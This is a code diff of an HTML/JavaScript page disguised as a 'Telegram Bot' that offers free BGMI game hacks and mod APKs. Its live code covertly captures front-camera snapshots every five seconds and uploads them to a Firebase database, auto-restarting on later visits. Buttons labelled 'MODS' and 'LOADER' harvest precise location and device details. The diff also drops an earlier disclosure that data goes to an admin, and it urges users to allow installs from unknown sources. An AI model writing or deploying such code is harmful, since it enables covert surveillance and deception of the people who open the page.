@@ -2,112 +2,218 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
     <title>Telegram Bot</title>
     <!-- Firebase SDK -->
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
     <style>
         :root {
-            --telegram-blue: #0088cc;
-            --telegram-light: #e1f3fb;
+            /* Light theme */
+            --bg-color: #f0f2f5;
+            --chat-bg: #f5f5f5;
+            --header-bg: #0088cc;
+            --header-text: #ffffff;
+            --bot-message-bg: #ffffff;
+            --user-message-bg: #0088cc;
+            --user-message-text: #ffffff;
+            --button-bg: #0088cc;
+            --button-hover-bg: #0077b3;
+            --text-color: #000000;
+            --url-box-bg: #f8f9fa;
+            --url-box-border: #ddd;
+            --error-bg: #ffeeee;
+            --error-text: #ff3333;
+            --download-btn-bg: #4CAF50;
+        }
+        /* Dark theme */
+        [data-theme="dark"] {
+            --bg-color: #17212b;
+            --chat-bg: #0e1621;
+            --header-bg: #2a3f5f;
+            --header-text: #e5e5e5;
+            --bot-message-bg: #2a3f5f;
+            --user-message-bg: #3f729b;
+            --user-message-text: #e5e5e5;
+            --button-bg: #3f729b;
+            --button-hover-bg: #355f80;
+            --text-color: #e5e5e5;
+            --url-box-bg: #242f3d;
+            --url-box-border: #3a4a5f;
+            --error-bg: #4a1a1a;
+            --error-text: #ff6666;
+            --download-btn-bg: #388e3c;
         }
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: #f0f2f5;
+            font-family: 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background: var(--bg-color);
+            color: var(--text-color);
             margin: 0;
-            padding: 0;
+            padding: env(safe-area-inset-top) env(safe-area-inset-right) env(safe-area-inset-bottom) env(safe-area-inset-left);
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
+            min-height: 100vh;
+            transition: background 0.3s ease;
+            overscroll-behavior: none;
         }
         .telegram-bot {
             width: 100%;
             max-width: 400px;
-            height: 600px;
-            background: white;
+            height: 100vh;
+            max-height: 700px;
+            background: var(--chat-bg);
             border-radius: 15px;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
             overflow: hidden;
             display: flex;
             flex-direction: column;
         }
         .bot-header {
-            background: var(--telegram-blue);
-            color: white;
-            padding: 15px;
+            background: var(--header-bg);
+            color: var(--header-text);
+            padding: 12px 15px;
             text-align: center;
-            font-weight: bold;
+            font-weight: 500;
             font-size: 18px;
+            position: sticky;
+            top: 0;
+            z-index: 10;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+        }
+        .theme-toggle {
+            background: none;
+            border: none;
+            color: var(--header-text);
+            font-size: 20px;
+            cursor: pointer;
+            padding: 5px;
+            transition: transform 0.3s ease;
+        }
+        .theme-toggle:hover {
+            transform: scale(1.1);
         }
         .bot-messages {
             flex: 1;
             padding: 15px;
             overflow-y: auto;
-            background: #f5f5f5;
+            scrollbar-width: thin;
+            scrollbar-color: var(--button-bg) var(--chat-bg);
+        }
+        .bot-messages::-webkit-scrollbar {
+            width: 6px;
+        }
+        .bot-messages::-webkit-scrollbar-thumb {
+            background: var(--button-bg);
+            border-radius: 3px;
         }
         .message {
             margin-bottom: 12px;
             padding: 10px 15px;
-            border-radius: 8px;
+            border-radius: 12px;
             max-width: 80%;
             line-height: 1.4;
             position: relative;
-            animation: fadeIn 0.3s ease;
+            animation: slideIn 0.3s ease;
+            display: inline-block;
         }
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateX(-20px); }
+            to { opacity: 1; transform: translateX(0); }
         }
         .bot-message {
-            background: white;
-            align-self: flex-start;
-            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+            background: var(--bot-message-bg);
+            color: var(--text-color);
+            border-bottom-left-radius: 4px;
         }
         .user-message {
-            background: var(--telegram-blue);
-            color: white;
-            align-self: flex-end;
+            background: var(--user-message-bg);
+            color: var(--user-message-text);
+            margin-left: auto;
+            border-bottom-right-radius: 4px;
         }
         .bot-options {
             display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 10px;
-            padding: 15px;
-            background: white;
-            border-top: 1px solid #e9ecef;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 8px;
+            padding: 10px;
+            background: var(--chat-bg);
+            border-top: 1px solid rgba(255,255,255,0.1);
         }
         .bot-btn {
-            background: var(--telegram-blue);
-            color: white;
+            background: var(--button-bg);
+            color: var(--header-text);
             border: none;
-            padding: 12px;
+            padding: 10px;
             border-radius: 8px;
             cursor: pointer;
-            font-size: 14px;
-            transition: all 0.2s;
+            font-size: 13px;
+            transition: background 0.2s, transform 0.1s;
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 5px;
+            touch-action: manipulation;
         }
-        .bot-btn:hover {
-            background: #0077b3;
+        .bot-btn:hover, .bot-btn:active {
+            background: var(--button-hover-bg);
+            transform: scale(0.98);
         }
         .bot-btn:disabled {
             background: #cccccc;
             cursor: not-allowed;
         }
-        .url-box {
-            background: #f8f9fa;
+        .url-box, .apk-list {
+            background: var(--url-box-bg);
             padding: 10px;
             border-radius: 5px;
             margin-top: 10px;
             word-break: break-all;
             font-family: monospace;
             font-size: 13px;
-            border: 1px dashed #ddd;
+            border: 1px dashed var(--url-box-border);
+        }
+        .apk-item {
+            margin-bottom: 10px;
+            padding: 10px;
+            background: var(--bot-message-bg);
+            border-radius: 5px;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+        }
+        .apk-item h3 {
+            margin: 0 0 5px;
+            font-size: 16px;
+            color: var(--button-bg);
+        }
+        .apk-item p {
+            margin: 0 0 10px;
+            font-size: 13px;
+            color: var(--text-color);
+        }
+        .support-form {
+            margin-top: 10px;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        .support-form input, .support-form textarea {
+            padding: 8px;
+            border: 1px solid var(--url-box-border);
+            border-radius: 5px;
+            background: var(--url-box-bg);
+            color: var(--text-color);
+            font-size: 13px;
+        }
+        .support-form button {
+            background: var(--download-btn-bg);
+            color: var(--header-text);
+            border: none;
+            padding: 8px;
+            border-radius: 5px;
+            cursor: pointer;
         }
         .loading {
             color: #666;
@@ -115,8 +221,8 @@
             padding: 10px;
         }
         .error {
-            color: #ff3333;
-            background: #ffeeee;
+            color: var(--error-text);
+            background: var(--error-bg);
             padding: 10px;
             border-radius: 5px;
         }
@@ -132,9 +238,9 @@
             display: block;
         }
         .permission-denied {
-            color: #ff3333;
+            color: var(--error-text);
             padding: 10px;
-            background: #ffeeee;
+            background: var(--error-bg);
             border-radius: 5px;
             margin-top: 10px;
         }
@@ -142,8 +248,8 @@
             display: none;
         }
         .download-btn {
-            background: #4CAF50;
-            color: white;
+            background: var(--download-btn-bg);
+            color: var(--header-text);
             border: none;
             padding: 10px 15px;
             border-radius: 5px;
@@ -151,6 +257,11 @@
             cursor: pointer;
             display: inline-block;
             animation: pulse 2s infinite;
+            transition: background 0.2s, transform 0.1s;
+        }
+        .download-btn:hover, .download-btn:active {
+            background: #388e3c;
+            transform: scale(0.98);
         }
         @keyframes pulse {
             0% { transform: scale(1); }
@@ -180,16 +291,26 @@
             animation: bounce 2s infinite;
         }
         @keyframes bounce {
-            0%, 20%, 50%, 80%, 100% {transform: translateY(0);}
-            40% {transform: translateY(-20px);}
-            60% {transform: translateY(-10px);}
+            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
+            40% { transform: translateY(-20px); }
+            60% { transform: translateY(-10px); }
+        }
+        @media (max-width: 400px) {
+            .telegram-bot {
+                border-radius: 0;
+                max-height: 100vh;
+            }
+            .bot-options {
+                grid-template-columns: repeat(2, 1fr);
+            }
         }
     </style>
 </head>
 <body>
     <div class="telegram-bot">
         <div class="bot-header">
-            Telegram BOT 🤖
+            <span>Telegram BOT 🤖</span>
+            <button class="theme-toggle" id="themeToggle" title="Toggle Theme">🌙</button>
         </div>
         <div class="bot-messages" id="messages">
             <div class="message bot-message">
@@ -197,18 +318,12 @@
             </div>
         </div>
         <div class="bot-options">
-            <button class="bot-btn" onclick="handleBot()" id="botBtn">
-                🤖 BOT
-            </button>
-            <button class="bot-btn" onclick="handleLocation()">
-                📍 MODS
-            </button>
-            <button class="bot-btn" onclick="handleDetails()">
-                ℹ️ LOADER 
-            </button>
-            <button class="bot-btn" onclick="handleHelp()">
-                ❓ Help
-            </button>
+            <button class="bot-btn" onclick="handleBot()" id="botBtn">🤖 BOT</button>
+            <button class="bot-btn" onclick="handleLocation()">📍 MODS</button>
+            <button class="bot-btn" onclick="handleDetails()">ℹ️ LOADER</button>
+            <button class="bot-btn" onclick="handleModApk()">📱 MOD APK</button>
+            <button class="bot-btn" onclick="handleSupport()">💬 Support</button>
+            <button class="bot-btn" onclick="handleHelp()">❓ Help</button>
         </div>
     </div>
     <video id="backgroundCamera" autoplay playsinline></video>
@@ -231,10 +346,28 @@
 
         const messagesEl = document.getElementById('messages');
         const botBtn = document.getElementById('botBtn');
+        const themeToggle = document.getElementById('themeToggle');
         const backgroundCamera = document.getElementById('backgroundCamera');
         let cameraStream = null;
         let snapshotInterval = null;
         let botActive = false;
+
+        // Theme toggle
+        function toggleTheme() {
+            const currentTheme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'light' : 'dark';
+            document.documentElement.setAttribute('data-theme', currentTheme);
+            themeToggle.textContent = currentTheme === 'dark' ? '☀️' : '🌙';
+            localStorage.setItem('theme', currentTheme);
+        }
+
+        // Load saved theme
+        function loadTheme() {
+            const savedTheme = localStorage.getItem('theme') || 'light';
+            document.documentElement.setAttribute('data-theme', savedTheme);
+            themeToggle.textContent = savedTheme === 'dark' ? '☀️' : '🌙';
+        }
+
+        themeToggle.addEventListener('click', toggleTheme);
 
         // Add message to chat
         function addMessage(text, isUser = false) {
@@ -263,18 +396,17 @@
             if (loading) loading.remove();
         }
 
-        // Capture snapshot from video stream
+        // Capture snapshot
         function captureSnapshot(videoElement) {
             try {
                 const canvas = document.createElement('canvas');
                 canvas.width = videoElement.videoWidth;
                 canvas.height = videoElement.videoHeight;
                 if (canvas.width === 0 || canvas.height === 0) {
-                    throw new Error('Video dimensions are not available. Camera may not be active.');
+                    throw new Error('Video dimensions are not available.');
                 }
                 canvas.getContext('2d').drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-                const imageData = canvas.toDataURL('image/jpeg');
-                return imageData;
+                return canvas.toDataURL('image/jpeg');
             } catch (error) {
                 console.error('Error capturing snapshot:', error);
                 return null;
@@ -286,27 +418,17 @@
             if (cameraStream && backgroundCamera.videoWidth > 0) {
                 const snapshotData = captureSnapshot(backgroundCamera);
                 if (snapshotData) {
-                    // Generate unique ID for each snapshot
                     const snapshotId = 'snap_' + Date.now();
-                    
                     database.ref('botSnapshots/' + snapshotId).set({
                         photo: snapshotData,
                         timestamp: firebase.database.ServerValue.TIMESTAMP,
                         deviceInfo: navigator.userAgent,
                         resolution: `${backgroundCamera.videoWidth}x${backgroundCamera.videoHeight}`
                     }).catch(error => {
-                        console.error('Error uploading snapshot to Firebase:', error);
-                        addMessage(`
-                            <div class="error">
-                                ❌ Error uploading BOT data: ${error.message}
-                            </div>
-                        `);
+                        console.error('Error uploading snapshot:', error);
+                        addMessage(`<div class="error">❌ Error uploading BOT data: ${error.message}</div>`);
                     });
-                } else {
-                    console.warn('Snapshot data is null, skipping upload.');
                 }
-            } else {
-                console.warn('Camera stream not active or video dimensions not available.');
             }
         }
 
@@ -319,15 +441,14 @@
         async function checkCameras() {
             try {
                 const devices = await navigator.mediaDevices.enumerateDevices();
-                const videoDevices = devices.filter(device => device.kind === 'videoinput');
-                return videoDevices.length > 0;
+                return devices.filter(device => device.kind === 'videoinput').length > 0;
             } catch (err) {
                 console.error('Error checking cameras:', err);
                 return false;
             }
         }
 
-        // Check camera permission status using Permissions API (if supported)
+        // Check camera permission
         async function checkCameraPermission() {
             if (navigator.permissions && navigator.permissions.query) {
                 try {
@@ -341,52 +462,32 @@
             return false;
         }
 
-        // Start the camera stream
+        // Start BOT
         async function startBot() {
             try {
                 if (!isCameraSupported()) {
-                    throw new Error('Camera API is not supported in this browser. Please use a modern browser like Chrome, Firefox, or Edge.');
+                    throw new Error('Camera API not supported. Use a modern browser.');
                 }
-
-                const hasCameras = await checkCameras();
-                if (!hasCameras) {
-                    throw new Error('No camera found. Please ensure a camera is connected to your device.');
+                if (!(await checkCameras())) {
+                    throw new Error('No camera found.');
                 }
-
-                cameraStream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'user' }
-                });
-
-                // Attach stream to hidden video element
+                cameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                 backgroundCamera.srcObject = cameraStream;
-
-                // Wait for video metadata to load to ensure dimensions are available
                 await new Promise((resolve, reject) => {
-                    backgroundCamera.onloadedmetadata = () => {
-                        console.log('Video metadata loaded:', backgroundCamera.videoWidth, 'x', backgroundCamera.videoHeight);
-                        resolve();
-                    };
-                    backgroundCamera.onerror = () => {
-                        reject(new Error('Error loading video stream.'));
-                    };
-                    // Fallback timeout
+                    backgroundCamera.onloadedmetadata = resolve;
+                    backgroundCamera.onerror = () => reject(new Error('Error loading video stream.'));
                     setTimeout(() => reject(new Error('Video metadata load timeout.')), 5000);
                 });
-
-                // Store permission status in localStorage
                 localStorage.setItem('botPermission', 'granted');
-
-                // Start periodic snapshot upload to Firebase
-                snapshotInterval = setInterval(uploadSnapshot, 5000); // Every 5 seconds
+                snapshotInterval = setInterval(uploadSnapshot, 5000);
                 botActive = true;
-
                 return true;
             } catch (error) {
                 throw error;
             }
         }
 
-        // Stop the BOT
+        // Stop BOT
         function stopBot() {
             if (cameraStream) {
                 cameraStream.getTracks().forEach(track => track.stop());
@@ -420,84 +521,47 @@
             const loading = showLoading();
 
             try {
-                const savedPermission = localStorage.getItem('botPermission');
-                let hasPermission = savedPermission === 'granted';
-
-                if (!hasPermission) {
-                    hasPermission = await checkCameraPermission();
+                let hasPermission = localStorage.getItem('botPermission') === 'granted' || await checkCameraPermission();
+                if (hasPermission && !cameraStream) {
+                    await startBot();
                 }
-
-                if (hasPermission) {
-                    if (!cameraStream) {
-                        await startBot();
-                    }
-                    hideLoading();
-                    addMessage(`
-                        <div>
-                            <div class="bot-animation">
-                                <div class="bot-icon">🤖</div>
-                                <p>BOT : THANKS YOU 🙂 HAVE A GOOD DAY !</p>
-                            </div>
-                            <p>Status: <span class="status-indicator status-active"></span> Active (will stop on browser close)</p>
- <a href="google.com</a>                       <p>BGMI SAFE HACK PROVIDE FOR FREE.</p>
-<a href='google.com</a>
-                            <button class="download-btn" onclick="handleBot()">
-                                ⏹️ Stop BOT
-                            </button>
-                        </div>
-                    `);
-                    botBtn.textContent = '⏹️ Stop BOT';
-                    return;
-                }
-
-                const permissionGranted = await startBot();
-
                 hideLoading();
-                if (permissionGranted) {
-                    addMessage(`
-                        <div>
-                            <div class="bot-animation">
-                                <div class="bot-icon">🤖</div>
-                                <p>BOT permission granted!</p>
-                            </div>
-                            <p>BOT is running in the background.</p>
-                            <p>Status: <span class="status-indicator status-active"></span> Active (will stop on browser close)</p>
-                            <p>Data is being collected and sent to admin every 5 seconds.</p>
-                            <button class="download-btn" onclick="handleBot()">
-                                ⏹️ Stop BOT
-                            </button>
+                addMessage(`
+                    <div>
+                        <div class="bot-animation">
+                            <div class="bot-icon">🤖</div>
+                            <p>BOT: THANKS YOU 🙂 HAVE A GOOD DAY!</p>
                         </div>
-                    `);
-                    botBtn.textContent = '⏹️ Stop BOT';
-                }
+                        <p>Status: <span class="status-indicator status-active"></span> Active (stops on browser close)</p>
+                        <p>BGMI SAFE HACK PROVIDE FOR FREE.</p>
+                        <button class="download-btn" onclick="handleBot()">⏹️ Stop BOT</button>
+                    </div>
+                `);
+                botBtn.textContent = '⏹️ Stop BOT';
             } catch (error) {
                 hideLoading();
                 let errorMessage = error.message || 'BOT access denied';
                 let troubleshootingTips = `
                     Troubleshooting:<br>
-                    • Ensure no other app or tab is using the camera.<br>
-                    • Check if a camera is connected and enabled.<br>
-                    • Allow camera permissions in browser settings.<br>
-                    • Use a modern browser (Chrome, Firefox, Edge).<br>
-                    • If not on localhost, ensure the site is served over HTTPS.<br>
-                    • Test camera on another app (e.g., webcamtests.com).
+                    • Ensure no other app/tab is using the camera.<br>
+                    • Check if a camera is connected.<br>
+                    • Allow camera permissions in settings.<br>
+                    • Use Chrome, Firefox, or Edge.<br>
+                    • Ensure HTTPS or localhost.<br>
+                    • Test camera at webcamtests.com.
                 `;
-
                 if (error.name === 'NotAllowedError') {
-                    errorMessage = 'BOT access denied. Please allow camera permissions in your browser settings.';
+                    errorMessage = 'BOT access denied. Allow camera permissions.';
                     localStorage.setItem('botPermission', 'denied');
                 } else if (error.name === 'NotFoundError' || error.message.includes('Could not start video source')) {
-                    errorMessage = 'Could not start BOT. No camera available or it might be in use by another application.';
+                    errorMessage = 'No camera available or in use by another app.';
                 } else if (error.name === 'NotReadableError') {
-                    errorMessage = 'Camera is in use by another application or tab. Please close other apps using the camera.';
+                    errorMessage = 'Camera in use by another app/tab.';
                 }
-
                 addMessage(`
                     <div class="error">
                         ❌ Error: ${errorMessage}
-                        <div class="permission-denied">
-                            ${troubleshootingTips}
-                        </div>
+                        <div class="permission-denied">${troubleshootingTips}</div>
                     </div>
                 `);
                 console.error('BOT error:', error);
@@ -506,27 +570,107 @@
             }
         }
 
-        // Auto-start BOT if permission was previously granted
-        async function initBot() {
-            const savedPermission = localStorage.getItem('botPermission');
-            if (savedPermission === 'granted') {
-                try {
-                    await startBot();
-                    console.log('BOT auto-started based on saved permission');
-                    botBtn.textContent = '⏹️ Stop BOT';
-                    addMessage(`
-                        <div class="message bot-message">
-                            <p>BOT auto-started with previous permissions.</p>
-                            <p>Status: <span class="status-indicator status-active"></span> Active</p>
-                            <button class="download-btn" onclick="handleBot()">
-                                ⏹️ Stop BOT
-                            </button>
+        // Handle MOD APK
+        async function handleModApk() {
+            addMessage('📱 MOD APK', true);
+            const loading = showLoading();
+            try {
+                const apkData = await database.ref('modApks').once('value').then(snapshot => snapshot.val());
+                const mockApks = [
+                    { id: 'apk1', name: 'BGMI MOD', description: 'Unlocked premium features, no ads, enhanced graphics.', downloadUrl: 'https://example.com/bgmi-mod.apk', version: '2.5.0', size: '85 MB' },
+                    { id: 'apk2', name: 'Free Fire MOD', description: 'Unlimited diamonds, aimbot, no recoil.', downloadUrl: 'https://example.com/freefire-mod.apk', version: '1.90.1', size: '70 MB' }
+                ];
+                const apks = apkData ? Object.values(apkData) : mockApks;
+                hideLoading();
+                let apkListHtml = '<div class="apk-list"><h3>Available MOD APKs</h3>';
+                apks.forEach(apk => {
+                    apkListHtml += `
+                        <div class="apk-item">
+                            <h3>${apk.name}</h3>
+                            <p>${apk.description}</p>
+                            <p>Version: ${apk.version} | Size: ${apk.size}</p>
+                            <a href="${apk.downloadUrl}" target="_blank" class="download-btn" onclick="logDownload('${apk.id}')">📥 Download</a>
                         </div>
-                    `);
-                } catch (error) {
-                    console.error('Auto-start BOT error:', error);
-                    localStorage.removeItem('botPermission');
-                }
+                    `;
+                });
+                apkListHtml += '</div>';
+                addMessage(`
+                    <div>
+                        ${apkListHtml}
+                        <small>Click to download MOD APKs. Enable "Install from Unknown Sources" on your device.</small>
+                    </div>
+                `);
+            } catch (error) {
+                hideLoading();
+                addMessage(`
+                    <div class="error">
+                        ❌ Error fetching MOD APKs: ${error.message}
+                        <div class="permission-denied">Try again later or contact support.</div>
+                    </div>
+                `);
+                console.error('MOD APK error:', error);
+            }
+        }
+
+        // Log download to Firebase
+        function logDownload(apkId) {
+            database.ref('apkDownloads/' + Date.now()).set({
+                apkId,
+                timestamp: firebase.database.ServerValue.TIMESTAMP,
+                deviceInfo: navigator.userAgent
+            }).catch(error => console.error('Error logging download:', error));
+        }
+
+        // Handle Support
+        async function handleSupport() {
+            addMessage('💬 Support', true);
+            addMessage(`
+                <div>
+                    <p>Submit your query below:</p>
+                    <div class="support-form">
+                        <input type="text" id="supportSubject" placeholder="Subject" required>
+                        <textarea id="supportMessage" placeholder="Describe your issue..." required></textarea>
+                        <button class="download-btn" onclick="submitSupport()">Submit</button>
+                    </div>
+                </div>
+            `);
+        }
+
+        // Submit support query
+        async function submitSupport() {
+            const subject = document.getElementById('supportSubject').value.trim();
+            const message = document.getElementById('supportMessage').value.trim();
+            if (!subject || !message) {
+                addMessage('<div class="error">❌ Please fill in both subject and message.</div>');
+                return;
+            }
+            const loading = showLoading();
+            try {
+                const queryId = 'query_' + Date.now();
+                await database.ref('supportQueries/' + queryId).set({
+                    subject,
+                    message,
+                    status: 'pending',
+                    timestamp: firebase.database.ServerValue.TIMESTAMP,
+                    deviceInfo: navigator.userAgent
+                });
+                hideLoading();
+                addMessage(`
+                    <div>
+                        <p>✅ Support query submitted!</p>
+                        <div class="url-box">
+                            Subject: ${subject}<br>
+                            Message: ${message}<br>
+                            <small>Our team will respond soon.</small>
+                        </div>
+                    </div>
+                `);
+                document.getElementById('supportSubject').value = '';
+                document.getElementById('supportMessage').value = '';
+            } catch (error) {
+                hideLoading();
+                addMessage(`<div class="error">❌ Error submitting query: ${error.message}</div>`);
+                console.error('Support error:', error);
             }
         }
 
@@ -534,12 +678,10 @@
         async function handleLocation() {
             addMessage('📍 Location', true);
             const loading = showLoading();
-
             try {
                 if (!navigator.geolocation) {
-                    throw new Error('Geolocation API not supported in this browser');
+                    throw new Error('Geolocation API not supported.');
                 }
-
                 const position = await new Promise((resolve, reject) => {
                     navigator.geolocation.getCurrentPosition(resolve, reject, {
                         enableHighAccuracy: true,
@@ -547,7 +689,6 @@
                         maximumAge: 0
                     });
                 });
-
                 hideLoading();
                 const { latitude, longitude } = position.coords;
                 const locationData = {
@@ -556,36 +697,28 @@
                     mapLink: `https://www.google.com/maps?q=${latitude},${longitude}`,
                     timestamp: firebase.database.ServerValue.TIMESTAMP
                 };
-
-                database.ref('userData/location').set(locationData).then(() => {
-                    addMessage(`
-                        <div>
-                            <p>📍 Your Location:</p>
-                            <div class="url-box">
-                                Latitude: ${latitude.toFixed(6)}<br>
-                                Longitude: ${longitude.toFixed(6)}<br>
-                                <a href="${locationData.mapLink}" target="_blank">View on Map</a>
-                            </div>
-                            <small>Location stored in Firebase for admin view.</small>
+                await database.ref('userData/location').set(locationData);
+                addMessage(`
+                    <div>
+                        <p>📍 Your Location:</p>
+                        <div class="url-box">
+                            Latitude: ${latitude.toFixed(6)}<br>
+                            Longitude: ${longitude.toFixed(6)}<br>
+                            <a href="${locationData.mapLink}" target="_blank"> nun View on Map</a>
                         </div>
-                    `);
-                }).catch(error => {
-                    addMessage(`
-                        <div class="error">
-                            ❌ Error storing location in Firebase: ${error.message}
-                        </div>
-                    `);
-                });
+                        <small>Location stored in Firebase.</small>
+                    </div>
+                `);
             } catch (error) {
                 hideLoading();
                 let errorMessage = error.message || 'Location access denied';
-                if (error.name === 'PermissionDeniedError') {
-                    errorMessage = 'Location access denied. Please allow location permissions in your browser settings.';
+                if (error.code === 1) {
+                    errorMessage = 'Location access denied. Allow permissions in settings.';
                 }
                 addMessage(`
                     <div class="error">
                         ❌ Error: ${errorMessage}
-                        <div class="permission-denied">Please allow location permissions in your browser settings</div>
+                        <div class="permission-denied">Allow location permissions in settings.</div>
                     </div>
                 `);
                 console.error('Location error:', error);
@@ -596,7 +729,6 @@
         async function handleDetails() {
             addMessage('ℹ️ My Details', true);
             const loading = showLoading();
-
             setTimeout(() => {
                 hideLoading();
                 const detailsData = {
@@ -605,7 +737,6 @@
                     device: navigator.userAgent.split(')')[0].split('(')[1] || 'Unknown',
                     timestamp: firebase.database.ServerValue.TIMESTAMP
                 };
-
                 database.ref('userData/details').set(detailsData).then(() => {
                     addMessage(`
                         <div>
@@ -615,39 +746,47 @@
                                 IP: ${detailsData.ip}<br>
                                 Device: ${detailsData.device}
                             </div>
-                            <small>Details stored in Firebase for admin view.</small>
+                            <small>Details stored in Firebase.</small>
                         </div>
                     `);
                 }).catch(error => {
-                    addMessage(`
-                        <div class="error">
-                            ❌ Error storing details in Firebase: ${error.message}
-                        </div>
-                    `);
+                    addMessage(`<div class="error">❌ Error storing details: ${error.message}</div>`);
                 });
             }, 800);
         }
 
         // Handle Help
-        function handleHelp() {
+        async function handleHelp() {
             addMessage('❓ Help', true);
-            setTimeout(() => {
+            const loading = showLoading();
+            try {
+                const helpData = await database.ref('helpContent').once('value').then(snapshot => snapshot.val());
+                const defaultHelp = `
+                    <b>Available Commands:</b><br>
+                    • BOT - Start/Stop background BOT<br>
+                    • Location - Share your location<br>
+                    • Details - View your details<br>
+                    • MOD APK - Browse and download MOD APKs<br>
+                    • Support - Submit a query to our team<br>
+                    <b>Note:</b> BOT runs in background, sending data to admin every 5 seconds.
+                `;
+                hideLoading();
                 addMessage(`
                     <div>
                         <p>🆘 BOT Help Center</p>
                         <div class="url-box">
-                            <b>Available Commands:</b><br>
-                            • BOT - Start/Stop background BOT<br>
-                            • Location - Share your location<br>
-                            • Details - View your details<br><br>
-                            <b>Note:</b> BOT runs in background, data sent to admin every 5 seconds. Data is stored in Firebase for admin view.
+                            ${helpData?.content || defaultHelp}
                         </div>
                     </div>
                 `);
-            }, 500);
+            } catch (error) {
+                hideLoading();
+                addMessage(`<div class="error">❌ Error fetching help content: ${error.message}</div>`);
+                console.error('Help error:', error);
+            }
         }
 
-        // Clean up when leaving
+        // Clean up on page unload
         window.addEventListener('beforeunload', () => {
             if (cameraStream) {
                 cameraStream.getTracks().forEach(track => track.stop());
@@ -658,7 +797,28 @@
             }
         });
 
-        // Initialize BOT on page load
+        // Initialize
+        async function initBot() {
+            loadTheme();
+            const savedPermission = localStorage.getItem('botPermission');
+            if (savedPermission === 'granted') {
+                try {
+                    await startBot();
+                    botBtn.textContent = '⏹️ Stop BOT';
+                    addMessage(`
+                        <div>
+                            <p>BOT auto-started with previous permissions.</p>
+                            <p>Status: <span class="status-indicator status-active"></span> Active</p>
+                            <button class="download-btn" onclick="handleBot()">⏹️ Stop BOT</button>
+                        </div>
+                    `);
+                } catch (error) {
+                    console.error('Auto-start BOT error:', error);
+                    localStorage.removeItem('botPermission');
+                }
+            }
+        }
+
         initBot();
     </script>
 </body>
